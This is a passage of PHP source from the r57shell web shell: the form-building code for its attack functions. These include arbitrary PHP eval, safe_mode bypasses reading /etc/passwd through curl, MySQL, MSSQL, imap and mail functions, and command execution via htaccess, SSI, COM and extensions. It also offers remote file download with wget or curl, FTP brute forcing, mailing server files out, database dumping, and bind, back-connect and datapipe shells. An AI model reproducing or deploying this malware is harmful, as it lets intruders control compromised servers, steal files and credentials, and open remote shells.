    echo sr(15,"<b>".$lang[$language.'_text58'].$arrow."</b>",in('text','mk_name',54,(!empty($_POST['mk_name'])?($_POST['mk_name']):("new_name"))).ws(4)."<select name=action><option value=create>".$lang[$language.'_text65']."</option><option value=delete>".$lang[$language.'_text66']."</option></select>".ws(3)."<select name=what><option value=file>".$lang[$language.'_text59']."</option><option value=dir>".$lang[$language.'_text60']."</option></select>".in('hidden','cmd',0,'mk').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt13']));
    echo $te.'</div>'.$table_end1.$fe;
}


/******************************************************************************************************/
// FUNCTION_COED : FC-0091
//



if($safe_mode && $unix)
{
    echo $fs.$table_up1.div_title($lang[$language.'_text67'],'id5').$table_up2.div('id5').$ts;
    echo sr(15,"<b>".$lang[$language.'_text68'].$arrow."</b>","<select name=what><option value=mod>CHMOD</option><option value=own>CHOWN</option><option value=grp>CHGRP</option></select>".ws(2)."<b>".$lang[$language.'_text69'].$arrow."</b>".ws(2).in('text','param1',40,(($_POST['param1'])?($_POST['param1']):("filename"))).ws(2)."<b>".$lang[$language.'_text70'].$arrow."</b>".ws(2).in('text','param2 title="'.$lang[$language.'_text71'].'"',26,(($_POST['param2'])?($_POST['param2']):("0777"))).in('hidden','cmd',0,'ch_').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
    echo $te.'</div>'.$table_end1.$fe;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0092
//



if(!$safe_mode)
{
    $aliases2 = '';
    foreach ($aliases as $alias_name=>$alias_cmd)
    {
        $aliases2 .= "<option>$alias_name</option>";
    }

    echo $fs.$table_up1.div_title($lang[$language.'_text7'],'id6').$table_up2.div('id6').$ts;
    echo sr(15,"<b>".ws(9).$lang[$language.'_text8'].$arrow.ws(4)."</b>","<select name=alias>".$aliases2."</select>".in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
    echo $te.'</div>'.$table_end1.$fe;
}


/******************************************************************************************************/
// FUNCTION_COED : FC-0093
//



echo $fs.$table_up1.div_title($lang[$language.'_text54'],'id7').$table_up2.div('id7').$ts;
echo sr(15,"<b>".$lang[$language.'_text52'].$arrow."</b>",in('text','s_text',85,'text').ws(4).in('submit','submit',0,$lang[$language.'_butt12']));
echo sr(15,"<b>".$lang[$language.'_text53'].$arrow."</b>",in('text','s_dir',85,$dir)." * ( /root;/home;/tmp )");
echo sr(15,"<b>".$lang[$language.'_text55'].$arrow."</b>",in('checkbox','m id=m',0,'1').in('text','s_mask',82,'.txt;.php')."* ( .txt;.php;.htm )".in('hidden','cmd',0,'search_text').in('hidden','dir',0,$dir));
echo $te.'</div>'.$table_end1.$fe;

/******************************************************************************************************/
// FUNCTION_COED : FC-0094
//



if(!$safe_mode && $unix)
{
    echo $fs.$table_up1.div_title($lang[$language.'_text76'],'id8').$table_up2.div('id8').$ts;
    echo sr(15,"<b>".$lang[$language.'_text72'].$arrow."</b>",in('text','s_text',85,'text').ws(4).in('submit','submit',0,$lang[$language.'_butt12']));
    echo sr(15,"<b>".$lang[$language.'_text73'].$arrow."</b>",in('text','s_dir',85,$dir)." * ( /root;/home;/tmp )");
    echo sr(15,"<b>".$lang[$language.'_text74'].$arrow."</b>",in('text','s_mask',85,'*.[hc]').ws(1).$lang[$language.'_text75'].in('hidden','cmd',0,'find_text').in('hidden','dir',0,$dir));
    echo $te.'</div>'.$table_end1.$fe;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0095
//



echo $fs.$table_up1.div_title($lang[$language.'_text32'],'id9').$table_up2.$font;
echo "<div align=center>".div('id9')."<textarea name=php_eval cols=100 rows=5>";
echo (!empty($_POST['php_eval'])?($_POST['php_eval']):("/* delete script */\r\n//unlink(\"r57shell.php\");\r\n//readfile(\"/etc/passwd\");\r\n"));
echo "</textarea>";
echo in('hidden','dir',0,$dir).in('hidden','cmd',0,'php_eval');
echo "<br>".ws(1).in('submit','submit',0,$lang[$language.'_butt1']);
echo "</div></div></font>";
echo $table_end1.$fe;

/******************************************************************************************************/
// FUNCTION_COED : FC-0096
//



if($safe_mode&&$curl_on)
{
    echo $fs.$table_up1.div_title($lang[$language.'_text33'],'id10').$table_up2.div('id10').$ts;
    echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test1_file',85,(!empty($_POST['test1_file'])?($_POST['test1_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test1').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
    echo $te.'</div>'.$table_end1.$fe;
}


/******************************************************************************************************/
// FUNCTION_COED : FC-0097
//


if($safe_mode)
{
    echo $fs.$table_up1.div_title($lang[$language.'_text34'],'id11').$table_up2.div('id11').$ts;
    echo "<table class=table1 width=100% align=center>";
    echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test2_file',85,(!empty($_POST['test2_file'])?($_POST['test2_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test2').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
    echo $te.'</div>'.$table_end1.$fe;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0098
//



if($safe_mode&&$mysql_on)
{
    echo $fs.$table_up1.div_title($lang[$language.'_text35'],'id12').$table_up2.div('id12').$ts;
    echo sr(15,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3_md']):("mysql"))).ws(4)."<b>".$lang[$language.'_text37'].$arrow."</b>".in('text','test3_ml',15,(!empty($_POST['test3_ml'])?($_POST['test3_ml']):("root"))).ws(4)."<b>".$lang[$language.'_text38'].$arrow."</b>".in('text','test3_mp',15,(!empty($_POST['test3_mp'])?($_POST['test3_mp']):("password"))).ws(4)."<b>".$lang[$language.'_text14'].$arrow."</b>".in('text','test3_port',15,(!empty($_POST['test3_port'])?($_POST['test3_port']):("3306"))));
    echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test3_file',96,(!empty($_POST['test3_file'])?($_POST['test3_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test3').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
    echo $te.'</div>'.$table_end1.$fe;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0099
//



if($safe_mode&&$mssql_on)
{
    echo $fs.$table_up1.div_title($lang[$language.'_text85'],'id13').$table_up2.div('id13').$ts;
    echo sr(15,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','test4_md',15,(!empty($_POST['test4_md'])?($_POST['test4_md']):("master"))).ws(4)."<b>".$lang[$language.'_text37'].$arrow."</b>".in('text','test4_ml',15,(!empty($_POST['test4_ml'])?($_POST['test4_ml']):("sa"))).ws(4)."<b>".$lang[$language.'_text38'].$arrow."</b>".in('text','test4_mp',15,(!empty($_POST['test4_mp'])?($_POST['test4_mp']):("password"))).ws(4)."<b>".$lang[$language.'_text14'].$arrow."</b>".in('text','test4_port',15,(!empty($_POST['test4_port'])?($_POST['test4_port']):("1433"))));
    echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','test4_file',96,(!empty($_POST['test4_file'])?($_POST['test4_file']):("dir"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test4').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
    echo $te.'</div>'.$table_end1.$fe;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0100
//


if($safe_mode&&$unix&&function_exists('mb_send_mail')){
    echo $fs.$table_up1.div_title($lang[$language.'_text112'],'id22').$table_up2.div('id22').$ts;
    echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test5_file',96,(!empty($_POST['test5_file'])?($_POST['test5_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test5').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
    echo $te.'</div>'.$table_end1.$fe;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0101
//


if($safe_mode&&function_exists('imap_list')){
    echo $fs.$table_up1.div_title($lang[$language.'_text113'],'id23').$table_up2.div('id23').$ts;
    echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','test6_file',96,(!empty($_POST['test6_file'])?($_POST['test6_file']):($dir))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test6').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
    echo $te.'</div>'.$table_end1.$fe;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0102
//


if($safe_mode&&function_exists('imap_body')){
    echo $fs.$table_up1.div_title($lang[$language.'_text114'],'id24').$table_up2.div('id24').$ts;
    echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test7_file',96,(!empty($_POST['test7_file'])?($_POST['test7_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test7').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
    echo $te.'</div>'.$table_end1.$fe;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0103
//


if($safe_mode)
{
    echo $fs.$table_up1.div_title($lang[$language.'_text115'],'id25').$table_up2.div('id25').$ts;
    echo sr(15,"<b>".$lang[$language.'_text116'].$arrow."</b>",in('text','test8_file1',96,(!empty($_POST['test8_file1'])?($_POST['test8_file1']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test8'));
    echo sr(15,"<b>".$lang[$language.'_text117'].$arrow."</b>",in('text','test8_file2',96,(!empty($_POST['test8_file2'])?($_POST['test8_file2']):($dir))).ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
    echo $te.'</div>'.$table_end1.$fe;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0104
//


if($safe_mode && @substr(@php_sapi_name(), 0, 3) == 'cgi')
{
    echo $fs.$table_up1.div_title($lang[$language.'_text120'],'id26').$table_up2.div('id26').$ts;
    echo sr(0,'','<div align="center">'.in('hidden','dir',0,$dir).in('hidden','cmd',0,'test9').in('submit','submit',0,$lang[$language.'_butt8']).'</div>');
    echo $te.'</div>'.$table_end1.$fe;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0105
//


if($safe_mode)
{
    echo $fs.$table_up1.div_title($lang[$language.'_text122'],'id27').$table_up2.div('id27').$ts;
    echo sr(15,"<b>".$lang[$language.'_text124'].$arrow."</b>",in('text','test10_file',96,(!empty($_POST['test10_file'])?($_POST['test10_file']):('../../file.php'))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test10'));
    echo sr(15,"<b>".$lang[$language.'_text125'].$arrow."</b>",in('text','test10_content',96,(!empty($_POST['test10_content'])?($_POST['test10_content']):('<? echo \'gotcha\'; ?>'))).ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
    echo $te.'</div>'.$table_end1.$fe;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0106
//


// htaccess mail.
if($safe_mode)
{
    echo $fs.$table_up1.div_title($lang[$language.'_text123'],'id28').$table_up2.div('id28').$ts;
    echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','test11_cmd',96,(!empty($_POST['test11_cmd'])?($_POST['test11_cmd']):('ls -la'))).ws(4).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test11').in('submit','submit',0,$lang[$language.'_butt8']));
    echo $te.'</div>'.$table_end1.$fe;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0107
//


// htaccess SSI
if($safe_mode)
{
    echo $fs.$table_up1.div_title($lang[$language.'_text126'],'id29').$table_up2.div('id29').$ts;
    echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','test12_cmd',96,(!empty($_POST['test12_cmd'])?($_POST['test12_cmd']):('ls -la'))).ws(4).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test12').in('submit','submit',0,$lang[$language.'_butt8']));
    echo $te.'</div>'.$table_end1.$fe;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0108
//


// COM
if($safe_mode&&!$unix)
{
    echo $fs.$table_up1.div_title($lang[$language.'_text127'],'id30').$table_up2.div('id30').$ts;
    echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','test13_cmd',96,(!empty($_POST['test13_cmd'])?($_POST['test13_cmd']):('dir'))).ws(4).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test13').in('submit','submit',0,$lang[$language.'_butt8']));
    echo $te.'</div>'.$table_end1.$fe;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0109
//


// ionCube
if($safe_mode&&extension_loaded("ionCube Loader"))
{
    echo $fs.$table_up1.div_title($lang[$language.'_text128'],'id31').$table_up2.div('id31').$ts;
    echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test14_cmd',96,(!empty($_POST['test14_cmd'])?($_POST['test14_cmd']):('../../boot.ini'))).ws(4).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test14').in('submit','submit',0,$lang[$language.'_butt8']));
    echo $te.'</div>'.$table_end1.$fe;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0110
//


// win32std
if($safe_mode&&!$unix&&extension_loaded("win32std"))
{
    echo $fs.$table_up1.div_title($lang[$language.'_text129'],'id32').$table_up2.div('id32').$ts;
    echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','test15_cmd',96,(!empty($_POST['test15_cmd'])?($_POST['test15_cmd']):('dir'))).ws(4).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test15').in('submit','submit',0,$lang[$language.'_butt8']));
    echo $te.'</div>'.$table_end1.$fe;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0111
//


// win32service
if($safe_mode&&!$unix&&extension_loaded("win32service"))
{
    echo $fs.$table_up1.div_title($lang[$language.'_text130'],'id33').$table_up2.div('id33').$ts;
    echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','test16_cmd',96,(!empty($_POST['test16_cmd'])?($_POST['test16_cmd']):('dir'))).ws(4).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test16').in('submit','submit',0,$lang[$language.'_butt8']));
    echo $te.'</div>'.$table_end1.$fe;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0112
//


// perl
if($safe_mode&&extension_loaded("perl"))
{
    echo $fs.$table_up1.div_title($lang[$language.'_text131'],'id34').$table_up2.div('id34').$ts;
    echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','test17_cmd',96,(!empty($_POST['test17_cmd'])?($_POST['test17_cmd']):('dir'))).ws(4).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test17').in('submit','submit',0,$lang[$language.'_butt8']));
    echo $te.'</div>'.$table_end1.$fe;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0113
//


// FFI
if($safe_mode&&!$unix&&extension_loaded("ffi"))
{
    echo $fs.$table_up1.div_title($lang[$language.'_text132'],'id35').$table_up2.div('id35').$ts;
    echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','test18_cmd',96,(!empty($_POST['test18_cmd'])?($_POST['test18_cmd']):('dir'))).ws(4).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test18').in('submit','submit',0,$lang[$language.'_butt8']));
    echo $te.'</div>'.$table_end1.$fe;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0114
//


if(@ini_get('file_uploads')){
    echo "<form name=upload method=POST ENCTYPE=multipart/form-data>";
    echo $table_up1.div_title($lang[$language.'_text5'],'id14').$table_up2.div('id14').$ts;
    echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile',85,''));
    echo sr(15,"<b>".$lang[$language.'_text21'].$arrow."</b>",in('checkbox','nf1 id=nf1',0,'1').in('text','new_name',82,'').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
    echo $te.'</div>'.$table_end1.$fe;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0115
//



if(!$safe_mode&&$unix){
    echo $fs.$table_up1.div_title($lang[$language.'_text15'],'id15').$table_up2.div('id15').$ts;
    echo sr(15,"<b>".$lang[$language.'_text16'].$arrow."</b>","<select size=\"1\" name=\"with\"><option value=\"wget\">wget</option><option value=\"fetch\">fetch</option><option value=\"lynx\">lynx</option><option value=\"links\">links</option><option value=\"curl\">curl</option><option value=\"GET\">GET</option></select>".in('hidden','dir',0,$dir).ws(2)."<b>".$lang[$language.'_text17'].$arrow."</b>".in('text','rem_file',78,'http://'));
    echo sr(15,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',105,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
    echo $te.'</div>'.$table_end1.$fe;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0116
//


echo $fs.$table_up1.div_title($lang[$language.'_text86'],'id16').$table_up2.div('id16').$ts;
echo sr(15,"<b>".$lang[$language.'_text59'].$arrow."</b>",in('text','d_name',85,$dir).in('hidden','cmd',0,'download_file').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt14']));
$arh = $lang[$language.'_text92'];

if(@function_exists('gzcompress'))
{
    $arh .= in('radio','compress',0,'zip').' zip';
}

if(@function_exists('gzencode'))
{
    $arh .= in('radio','compress',0,'gzip').' gzip';
}

if(@function_exists('bzcompress'))
{
    $arh .= in('radio','compress',0,'bzip').' bzip';
}

echo sr(15,"<b>".$lang[$language.'_text91'].$arrow."</b>",in('radio','compress',0,'none',1).' '.$arh);
echo $te.'</div>'.$table_end1.$fe;

/******************************************************************************************************/
// FUNCTION_COED : FC-0117
//



if(@function_exists("ftp_connect"))
{
    echo $table_up1.div_title($lang[$language.'_text93'],'id17').$table_up2.div('id17').$ts."<tr>".$fs."<td valign=top width=50%>".$ts;
    echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text87']."</div></b></font>";
    echo sr(25,"<b>".$lang[$language.'_text88'].$arrow."</b>",in('text','ftp_server_port',45,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))));
    echo sr(25,"<b>".$lang[$language.'_text37'].$arrow."</b>",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("anonymous"))));
    echo sr(25,"<b>".$lang[$language.'_text38'].$arrow."</b>",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POST['ftp_password']):("billy@microsoft.com"))));
    echo sr(25,"<b>".$lang[$language.'_text89'].$arrow."</b>",in('text','ftp_file',45,(!empty($_POST['ftp_file'])?($_POST['ftp_file']):("/ftp-dir/file"))).in('hidden','cmd',0,'ftp_file_down'));
    echo sr(25,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',45,$dir));
    echo sr(25,"<b>".$lang[$language.'_text90'].$arrow."</b>","<select name=ftp_mode><option>FTP_BINARY</option><option>FTP_ASCII</option></select>".in('hidden','dir',0,$dir));
    echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt14']));
    echo $te."</td>".$fe.$fs."<td valign=top width=50%>".$ts;
    echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text100']."</div></b></font>";
    echo sr(25,"<b>".$lang[$language.'_text88'].$arrow."</b>",in('text','ftp_server_port',45,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))));
    echo sr(25,"<b>".$lang[$language.'_text37'].$arrow."</b>",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("anonymous"))));
    echo sr(25,"<b>".$lang[$language.'_text38'].$arrow."</b>",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POST['ftp_password']):("billy@microsoft.com"))));
    echo sr(25,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',45,$dir));
    echo sr(25,"<b>".$lang[$language.'_text89'].$arrow."</b>",in('text','ftp_file',45,(!empty($_POST['ftp_file'])?($_POST['ftp_file']):("/ftp-dir/file"))).in('hidden','cmd',0,'ftp_file_up'));
    echo sr(25,"<b>".$lang[$language.'_text90'].$arrow."</b>","<select name=ftp_mode><option>FTP_BINARY</option><option>FTP_ASCII</option></select>".in('hidden','dir',0,$dir));
    echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt2']));
    echo $te."</td>".$fe."</tr></div></table>";
}

/******************************************************************************************************//******************************************************************************************************/
// FUNCTION_COED : FC-0118
//



if($unix && @function_exists("ftp_connect"))
{
    echo $fs.$table_up1.div_title($lang[$language.'_text94'],'id18').$table_up2.div('id18').$ts;
    echo sr(15,"<b>".$lang[$language.'_text88'].$arrow."</b>",in('text','ftp_server_port',85,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))).in('hidden','cmd',0,'ftp_brute').ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
    echo sr(15,"","<font face=Verdana size=-2>".$lang[$language.'_text99']." ( <a href=".$_SERVER['PHP_SELF']."?users>".$lang[$language.'_text95']."</a> )</font>");
    echo sr(15,"",in('checkbox','reverse id=reverse',0,'1').$lang[$language.'_text101']);
    echo $te.'</div>'.$table_end1.$fe;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0119
//



if(@function_exists("mail"))
{
    echo $table_up1.div_title($lang[$language.'_text102'],'id19').$table_up2.div('id19').$ts."<tr>".$fs."<td valign=top width=50%>".$ts;
    echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text103']."</div></b></font>";
    echo sr(25,"<b>".$lang[$language.'_text105'].$arrow."</b>",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):("hacker@mail.com"))).in('hidden','cmd',0,'mail').in('hidden','dir',0,$dir));
    echo sr(25,"<b>".$lang[$language.'_text106'].$arrow."</b>",in('text','from',45,(!empty($_POST['from'])?($_POST['from']):("billy@microsoft.com"))));
    echo sr(25,"<b>".$lang[$language.'_text107'].$arrow."</b>",in('text','subj',45,(!empty($_POST['subj'])?($_POST['subj']):("hello billy"))));
    echo sr(25,"<b>".$lang[$language.'_text108'].$arrow."</b>",'<textarea name=text cols=33 rows=2>'.(!empty($_POST['text'])?($_POST['text']):("mail text here")).'</textarea>');
    echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt15']));
    echo $te."</td>".$fe.$fs."<td valign=top width=50%>".$ts;
    echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text104']."</div></b></font>";
    echo sr(25,"<b>".$lang[$language.'_text105'].$arrow."</b>",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):("hacker@mail.com"))).in('hidden','cmd',0,'mail_file').in('hidden','dir',0,$dir));
    echo sr(25,"<b>".$lang[$language.'_text106'].$arrow."</b>",in('text','from',45,(!empty($_POST['from'])?($_POST['from']):("billy@microsoft.com"))));
    echo sr(25,"<b>".$lang[$language.'_text107'].$arrow."</b>",in('text','subj',45,(!empty($_POST['subj'])?($_POST['subj']):("file from r57shell"))));
    echo sr(25,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',45,$dir));
    echo sr(25,"<b>".$lang[$language.'_text91'].$arrow."</b>",in('radio','compress',0,'none',1).' '.$arh);
    echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt15']));
    echo $te."</td>".$fe."</tr></div></table>";
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0120
//



if($mysql_on||$mssql_on||$pg_on||$ora_on)
{
    $select = '<select name=db>';
    if($mysql_on)
	{
	    $select .= '<option>MySQL</option>';
	}
    if($mssql_on)
	{
	    $select .= '<option>MSSQL</option>';
	}

    if($pg_on)
	{
	    $select .= '<option>PostgreSQL</option>';
	}

    if($ora_on)
	{
	    $select .= '<option>Oracle</option>';
	}

    $select .= '</select>';
    echo $table_up1.div_title($lang[$language.'_text82'],'id20').$table_up2.div('id20').$ts."<tr>".$fs."<td valign=top width=50%>".$ts;
    echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text40']."</div></b></font>";
    echo sr(35,"<b>".$lang[$language.'_text80'].$arrow."</b>",$select);
    echo sr(35,"<b>".$lang[$language.'_text111'].$arrow."</b>",in('text','db_server',15,(!empty($_POST['db_server'])?($_POST['db_server']):("localhost"))).' <b>:</b> '.in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
    echo sr(35,"<b>".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow."</b>",in('text','mysql_l',15,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))).' <b>:</b> '.in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
    echo sr(35,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','mysql_db',15,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))).' <b>.</b> '.in('text','mysql_tbl',15,(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):("user"))));
    echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump')."<b>".$lang[$language.'_text41'].$arrow."</b>",in('checkbox','dif id=dif',0,'1').in('text','dif_name',31,(!empty($_POST['dif_name'])?($_POST['dif_name']):("dump.sql"))));
    echo sr(35,"",in('submit','submit',0,$lang[$language.'_butt9']));
    echo $te."</td>".$fe.$fs."<td valign=top width=50%>".$ts;
    echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text83']."</div></b></font>";
    echo sr(35,"<b>".$lang[$language.'_text80'].$arrow."</b>",$select);
    echo sr(35,"<b>".$lang[$language.'_text111'].$arrow."</b>",in('text','db_server',15,(!empty($_POST['db_server'])?($_POST['db_server']):("localhost"))).' <b>:</b> '.in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
    echo sr(35,"<b>".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow."</b>",in('text','mysql_l',15,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))).' <b>:</b> '.in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
    echo sr(35,"<b>".$lang[$language.'_text39'].$arrow."</b>",in('text','mysql_db',15,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))));
    echo sr(35,"<b>".$lang[$language.'_text84'].$arrow."</b>".in('hidden','dir',0,$dir).in('hidden','cmd',0,'db_query'),"");
    echo $te."<div align=center id='n'><textarea cols=55 rows=1 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES; SELECT * FROM user; SELECT version(); select user();"))."</textarea><br>".in('submit','submit',0,$lang[$language.'_butt1'])."</div></td>".$fe."</tr></div></table>";
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0121
//


if(!$safe_mode&&$unix)
{
    echo $table_up1.div_title($lang[$language.'_text81'],'id21').$table_up2.div('id21').$ts."<tr>".$fs."<td valign=top width=34%>".$ts;
    echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text9']."</div></b></font>";
    echo sr(40,"<b>".$lang[$language.'_text10'].$arrow."</b>",in('text','port',15,'11457'));
    echo sr(40,"<b>".$lang[$language.'_text11'].$arrow."</b>",in('text','bind_pass',15,'r57'));
    echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">Perl</option><option value=\"C\">C</option></select>".in('hidden','dir',0,$dir));
    echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt3']));
    echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
    echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text12']."</div></b></font>";
    echo sr(40,"<b>".$lang[$language.'_text13'].$arrow."</b>",in('text','ip',15,((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1"))));
    echo sr(40,"<b>".$lang[$language.'_text14'].$arrow."</b>",in('text','port',15,'11457'));
    echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">Perl</option><option value=\"C\">C</option></select>".in('hidden','dir',0,$dir));
    echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt4']));
    echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
    echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text22']."</div></b></font>";
    echo sr(40,"<b>".$lang[$language.'_text23'].$arrow."</b>",in('text','local_port',15,'11457'));
    echo sr(40,"<b>".$lang[$language.'_text24'].$arrow."</b>",in('text','remote_host',15,'irc.dalnet.ru'));
    echo sr(40,"<b>".$lang[$language.'_text25'].$arrow."</b>",in('text','remote_port',15,'6667'));
    echo sr(40,"<b>".$lang[$language.'_text26'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">datapipe.pl</option><option value=\"C\">datapipe.c</option></select>".in('hidden','dir',0,$dir));
    echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt5']));
    echo $te."</td>".$fe."</tr></div></table>";
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0122
//


    echo '</table>'.$table_up3."</div></div><div align=center id='n'><font face=Verdana size=-2><b>o---[ r57shell - http-shell by RST/GHC | <a href=http://rst.void.ru>http://rst.void.ru</a> | <a href=http://ghc.ru>http://ghc.ru</a> | version ".$version." ]---o</b></font></div></td></tr></table>";
    echo '</body></html>';

?>
